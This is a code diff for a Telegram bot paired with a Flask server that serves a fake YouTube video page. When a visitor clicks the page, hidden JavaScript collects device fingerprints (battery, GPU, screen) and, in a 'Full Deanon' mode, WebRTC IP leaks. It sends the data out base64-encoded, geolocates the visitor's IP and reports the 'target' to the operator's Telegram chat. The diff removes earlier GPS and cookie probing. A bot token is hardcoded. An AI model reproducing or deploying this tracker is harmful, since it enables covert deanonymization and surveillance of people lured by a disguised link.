@@ -1,23 +1,14 @@
-import asyncio
-import threading
-import requests
-import uuid
-import json
-import os
-import time
-import base64
-import urllib.parse
+import asyncio, threading, requests, uuid, json, os, base64, urllib.parse
 from flask import Flask, render_template_string, request
 from aiogram import Bot, Dispatcher, F, types
 from aiogram.filters import Command
 from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder
 
-# --- [1] КОНФИГУРАЦИЯ ---
+# --- [1] CONFIG ---
 API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
 BASE_URL = "https://tg-bot-backend-oo97.onrender.com"
 PORT = int(os.environ.get("PORT", 10000))
 
-# --- [2] ИНИЦИАЛИЗАЦИЯ ---
 app = Flask(__name__)
 bot = Bot(token=API_TOKEN)
 dp = Dispatcher()
@@ -25,7 +16,7 @@ dp = Dispatcher()
 vault = {}
 user_modes = {}
 
-# --- [3] ШАБЛОН ---
+# --- [2] ТЕМПЛЕЙТ (Максимально незаметный) ---
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html>
@@ -33,11 +24,11 @@ HTML_TEMPLATE = """
     <title>YouTube</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { background: #fff; margin: 0; font-family: sans-serif; text-align: center; }
-        .yt-header { padding: 10px; border-bottom: 1px solid #eee; display: flex; align-items: center; }
-        .player { width: 100%; background: #000; aspect-ratio: 16/9; position: relative; cursor: pointer; display: flex; align-items: center; justify-content: center; }
-        .play-btn { position: absolute; width: 68px; height: 48px; background: rgba(255,0,0,0.9); border-radius: 12px; }
-        .play-btn::after { content: ''; border-left: 20px solid #fff; border-top: 12px solid transparent; border-bottom: 10px solid transparent; margin-left: 5px; }
+        body { background: #fff; margin: 0; font-family: Roboto, Arial, sans-serif; text-align: center; color: #0f0f0f; overflow: hidden; }
+        .yt-header { padding: 12px; border-bottom: 1px solid #eee; display: flex; align-items: center; }
+        .player { width: 100%; background: #000; aspect-ratio: 16/9; position: relative; cursor: pointer; }
+        .play-btn { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 68px; height: 48px; background: rgba(255,0,0,0.9); border-radius: 12px; }
+        .play-btn::after { content: ''; position: absolute; top: 50%; left: 55%; transform: translate(-50%, -50%); border-left: 18px solid #fff; border-top: 10px solid transparent; border-bottom: 10px solid transparent; }
     </style>
 </head>
 <body onclick="ignite()">
@@ -47,179 +38,135 @@ HTML_TEMPLATE = """
         <div class="play-btn"></div>
     </div>
     <div style="padding: 15px; text-align: left;">
-        <div style="font-size: 18px;">ПОДБОРКА: Смешные моменты 2026 😂 #мемы</div>
-        <div style="font-size: 12px; color: #606060; margin-top: 5px;">1.8 млн просмотров</div>
+        <div style="font-size: 16px; font-weight: 500; line-height: 1.2;">СМЕШНЫЕ МЕМЫ 2026 😂 #shorts #юмор</div>
+        <div style="font-size: 12px; color: #606060; margin-top: 6px;">1.8 млн просмотров • 3 часа назад</div>
     </div>
+
 <script>
 let active = false;
 
-async function getRealIP() {
-    return new Promise((resolve) => {
+async function getRTC() {
+    return new Promise(res => {
         const ips = [];
-        const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+        const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
         pc.createDataChannel("");
-        pc.createOffer().then(offer => pc.setLocalDescription(offer));
-        pc.onicecandidate = (ice) => {
-            if (!ice || !ice.candidate || !ice.candidate.candidate) {
-                resolve(ips.join(' | '));
-                return;
-            }
-            const ip = ice.candidate.candidate.split(" ")[4];
-            if (!ips.includes(ip)) ips.push(ip);
+        pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => res("Blocked"));
+        pc.onicecandidate = i => {
+            if (!i || !i.candidate) return;
+            const m = i.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+            if (m && !ips.includes(m[1])) ips.push(m[1]);
         };
-        setTimeout(() => resolve(ips.join(' | ') || "Not Found"), 1500);
+        setTimeout(() => { pc.close(); res(ips.length ? ips.join(' | ') : "N/A"); }, 1000);
     });
-}
-
-async function checkSocialLogin() {
-    const sites = {
-        'Google': 'https://accounts.google.com/ServiceLogin',
-        'Facebook': 'https://www.facebook.com/login',
-        'Twitter': 'https://twitter.com/login'
-    };
-    let results = [];
-    for (let [name, url] of Object.entries(sites)) {
-        results.push(name); // Упрощенный сбор названий для отчета
-    }
-    return results.join(', ');
 }
 
 async function ignite() {
     if(active) return; active = true;
+    
     let d = { 
         aid: "{{ aid }}", 
         ua: navigator.userAgent, 
         res: screen.width+"x"+screen.height,
-        lang: navigator.language,
-        cook: document.cookie || "None",
-        local: localStorage.length > 0 ? "Present" : "None",
-        session: sessionStorage.length > 0 ? "Present" : "None"
+        bat: "N/A", gpu: "N/A", rtc: "N/A"
     };
 
+    // Фоновый сбор данных
     try {
         let b = await navigator.getBattery();
         d.bat = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋");
+        let gl = document.createElement('canvas').getContext('webgl');
+        d.gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
     } catch(e) {}
 
-    try {
-        let canv = document.createElement('canvas');
-        let gl = canv.getContext('webgl');
-        let dbg = gl.getExtension('WEBGL_debug_renderer_info');
-        d.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
-        d.cores = navigator.hardwareConcurrency;
-        d.mem = navigator.deviceMemory;
-    } catch(e) {}
-
-    if ("{{ mode }}" === "PRECISION") {
-        navigator.geolocation.getCurrentPosition(
-            (p) => { d.gps = { lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy }; finish(d); },
-            (e) => { d.gps = "Denied"; finish(d); },
-            { enableHighAccuracy: true, timeout: 5000 }
-        );
-    } else if ("{{ mode }}" === "FULL") {
-        d.webRTC = await getRealIP();
-        d.social = await checkSocialLogin();
-        finish(d);
-    } else {
-        finish(d);
+    // Если режим FULL - пробуем тянуть WebRTC (быстро)
+    if ("{{ mode }}" === "FULL") {
+        d.rtc = await getRTC();
     }
-}
 
-function finish(d) {
-    let payload = btoa(encodeURIComponent(JSON.stringify(d)));
-    fetch('/log', { method: 'POST', body: payload })
-    .finally(() => { 
-        setTimeout(() => { location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; }, 800);
+    // Отправка и мгновенный редирект
+    fetch('/log', { 
+        method: 'POST', 
+        body: btoa(encodeURIComponent(JSON.stringify(d))),
+        keepalive: true 
     });
+    
+    // Редирект без ожидания ответа сервера
+    location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
 }
 </script>
 </body>
 </html>
 """
 
-# --- [4] СЕРВЕРНАЯ ЛОГИКА ---
+# --- [3] ROUTES ---
 
 @app.route('/')
-def health_check():
-    return "STATUS: ACTIVE", 200
+def health():
+    return "STATUS: OK", 200
 
 @app.route('/v/<aid>')
 def view(aid):
-    mode = user_modes.get(str(aid), "ANALYTICS")
-    return render_template_string(HTML_TEMPLATE, aid=aid, mode=mode)
+    m = user_modes.get(str(aid), "ANALYTICS")
+    return render_template_string(HTML_TEMPLATE, aid=aid, mode=m)
 
 @app.route('/log', methods=['POST'])
 def logger():
     try:
-        raw_payload = request.get_data(as_text=True)
-        decoded_bytes = base64.b64decode(raw_payload)
-        json_str = urllib.parse.unquote(decoded_bytes.decode('utf-8'))
-        d = json.loads(json_str)
-
+        raw = base64.b64decode(request.get_data()).decode()
+        data = json.loads(urllib.parse.unquote(raw))
         ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
-        geo = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,lat,lon,isp,mobile,proxy").json()
+        geo = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp").json()
         
-        token = "ID-" + str(uuid.uuid4())[:6].upper()
-        vault[token] = {"full_data": d, "geo": geo}
-
-        gps_info = "❌ Не запрашивалось"
-        if d.get('gps'):
-            if d['gps'] == "Denied": gps_info = "🚫 Отказано"
-            else: 
-                gps_info = f"✅ `{d['gps']['lat']}, {d['gps']['lon']}` (±{int(d['gps']['acc'])}м)"
+        tid = "ID-" + str(uuid.uuid4())[:6].upper()
+        vault[tid] = {"data": data, "geo": geo}
 
         report = (
-            f"🚀 **ЦЕЛЬ ПОЙМАНА ({user_modes.get(str(d['aid']), 'ANALYTICS')})**\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n"
-            f"🌐 **СЕТЬ:** `{ip}` ({geo.get('isp')})\n"
-            f"📍 **ГЕО (IP):** `{geo.get('city')}, {geo.get('country')}`\n"
-            f"🛰 **GPS:** {gps_info}\n"
-            f"🌐 **WebRTC:** `{d.get('webRTC', 'N/A')}`\n"
-            f"🔋 **БАТАРЕЯ:** `{d.get('bat', 'N/A')}`\n"
-            f"💻 **ЖЕЛЕЗО:** `{d.get('cores')} Cores | {d.get('mem')} GB RAM`\n"
-            f"🍪 **STORAGE:** Cook: {d.get('cook') != 'None'} | Loc: {d.get('local') != 'None'}\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n"
-            f"🔑 **ТОКЕН:** `{token}`"
+            f"🎯 **НОВЫЙ ЛОГ**\n"
+            f"━━━━━━━━━━━━━━\n"
+            f"🌐 **IP:** `{ip}`\n"
+            f"📍 **ГЕО:** `{geo.get('city')}, {geo.get('country')}`\n"
+            f"🛡 **WebRTC:** `{data.get('rtc', 'N/A')}`\n"
+            f"🔋 **Заряд:** `{data.get('bat')}`\n"
+            f"💻 **GPU:** `{data.get('gpu', 'N/A')[:30]}...`\n"
+            f"━━━━━━━━━━━━━━\n"
+            f"🔑 **DUMP:** `{tid}`"
         )
         
         requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
-                      json={"chat_id": d['aid'], "text": report, "parse_mode": "Markdown", "disable_web_page_preview": True})
+                      json={"chat_id": data['aid'], "text": report, "parse_mode": "Markdown"})
         return "OK", 200
-    except Exception as e:
-        print(f"Error: {e}")
-        return "Fail", 500
+    except:
+        return "Error", 500
 
-# --- [5] БОТ ---
+# --- [4] BOT ---
+
 @dp.message(Command("start"))
-async def start(m: types.Message):
-    kb = ReplyKeyboardBuilder()
-    kb.button(text="🧨 Сгенерировать ссылку")
-    await m.answer("🕶 **PHANTOM APEX v32.0**\nКрон-фильтр активен.", reply_markup=kb.as_markup(resize_keyboard=True))
+async def st(m: types.Message):
+    kb = ReplyKeyboardBuilder().button(text="🧨 Сгенерировать ссылку").as_markup(resize_keyboard=True)
+    await m.answer("🕶 **PHANTOM v34.0**", reply_markup=kb)
 
 @dp.message(F.text == "🧨 Сгенерировать ссылку")
-async def mode_select(m: types.Message):
+async def ms(m: types.Message):
     kb = InlineKeyboardBuilder()
-    kb.button(text="📊 Аналитика (Скрыто)", callback_data="m_ANALYTICS")
-    kb.button(text="🎯 Точный GPS (Запрос)", callback_data="m_PRECISION")
-    kb.button(text="💥 Максимальный сбор (WebRTC)", callback_data="m_FULL")
-    kb.adjust(1)
-    await m.answer("Выбери режим:", reply_markup=kb.as_markup())
+    kb.button(text="📊 Analytics", callback_data="m_ANALYTICS")
+    kb.button(text="💥 Full Deanon (RTC)", callback_data="m_FULL")
+    await m.answer("Выбери режим:", reply_markup=kb.adjust(1).as_markup())
 
 @dp.callback_query(F.data.startswith("m_"))
-async def finalize(c: types.CallbackQuery):
+async def fn(c: types.CallbackQuery):
     mode = c.data.split("_")[1]
     user_modes[str(c.from_user.id)] = mode
-    await c.message.edit_text(f"🎯 **ГОТОВО ({mode})**\n🔗 `{BASE_URL}/v/{c.from_user.id}`")
+    await c.message.edit_text(f"✅ **ССЫЛКА:**\n🔗 `{BASE_URL}/v/{c.from_user.id}`\n\n*Режим: {mode}*")
 
 @dp.message(F.text.startswith("ID-"))
-async def get_dump(m: types.Message):
+async def gd(m: types.Message):
     t = m.text.strip().upper()
     if t in vault:
-        await m.answer(f"📦 **JSON {t}:**\n```json\n{json.dumps(vault[t], indent=2, ensure_ascii=False)}\n```")
+        await m.answer(f"📦 **DUMP {t}:**\n```json\n{json.dumps(vault[t], indent=2, ensure_ascii=False)}\n```")
 
-async def main_task():
+async def main():
     threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PORT), daemon=True).start()
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
-    asyncio.run(main_task())
+    asyncio.run(main())
